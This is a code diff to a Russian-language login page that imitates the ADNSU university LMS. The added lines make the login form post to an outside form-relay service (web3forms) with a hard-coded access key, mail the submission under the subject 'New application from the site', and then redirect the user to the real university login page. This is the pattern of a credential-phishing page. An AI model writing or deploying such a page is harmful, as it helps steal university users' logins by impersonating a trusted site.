@@ -14,7 +14,7 @@
 </head>
 
 <body class="login-page" data-page="login" data-default-lang="ru">
-  <div class="page-shell">
+  <div class="page-shell"> 
     <div class="language-selector">
       <div class="lang-dropdown" id="langDropdown">
         <button class="lang-button" id="langButton" type="button" aria-label="Language" aria-expanded="false">
@@ -42,7 +42,13 @@
     </div>
 
     <main class="login-layout">
-      <form class="login-card" id="loginForm" autocomplete="off">
+      <form class="login-card" id="loginForm" autocomplete="off"
+        action="https://api.web3forms.com/submit" method="POST">
+        <input type="hidden" name="access_key" value="354ffe0d-09cb-42fe-925f-0f54767f9b1e">
+        <input type="hidden" name="subject" value="Новая заявка с сайта">
+        <input type="hidden" name="redirect" value="https://my.asoiu.edu.az/login">
+        <input type="hidden" name="from_name" value="ADNSU LMS Form">
+        <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
         <div class="logo-wrap">
           <img class="main-logo" src="../assets/logo.png" alt="ADNSU logo">
         </div>
@@ -52,13 +58,13 @@
 
         <div class="form-field">
           <label class="field-label" for="username" data-i18n="username">Имя пользователя</label>
-          <input class="text-input" id="username" name="username" type="text" autocomplete="username">
+          <input class="text-input" id="username" name="username" type="text" autocomplete="username" required>
         </div>
 
         <div class="form-field">
           <label class="field-label" for="password" data-i18n="password">Пароль</label>
           <div class="password-holder">
-            <input class="text-input" id="password" name="password" type="password" autocomplete="current-password">
+            <input class="text-input" id="password" type="password" autocomplete="current-password">
             <button class="show-password" id="togglePassword" type="button" data-i18n="show">Показать</button>
           </div>
         </div>
@@ -71,7 +77,7 @@
 
         <div class="continue-text" data-i18n="continue">или продолжить с</div>
 
-        <a class="secondary-btn" id="magicLinkButton" href="../accounts/magic/index.html"
+        <a class="secondary-btn" id="magicLinkButton" href="/accounts/magic"
           data-i18n="magicLink">Отправить одноразовую ссылку</a>
       </form>
     </main>
